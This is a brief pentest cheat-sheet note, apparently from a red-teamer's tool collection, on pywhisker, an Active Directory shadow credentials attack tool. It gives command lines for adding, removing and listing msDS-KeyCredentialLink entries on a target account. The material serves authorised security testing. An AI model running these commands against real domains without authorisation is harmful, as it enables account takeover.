---
tags: [tool, activedirectory, shadow-credentials]
tool: "pywhisker"
category: "Active Directory"
installed: true
phase: [exploitation]
---

# pywhisker - Shadow Credentials Attack

## Tool Overview
Purpose: Shadow credentials attack (msDS-KeyCredentialLink)
Location: ~/tools/activedirectory/pywhisker/pywhisker.py

## How to Use It

Add Shadow Credentials:
pywhisker.py -d domain.local -u user -p pass -t target-user --action add

Remove Shadow Credentials:
pywhisker.py -d domain.local -u user -p pass -t target-user --action remove

List Shadow Credentials:
pywhisker.py -d domain.local -u user -p pass -t target-user --action list

## Related Tools
whisker, certipy
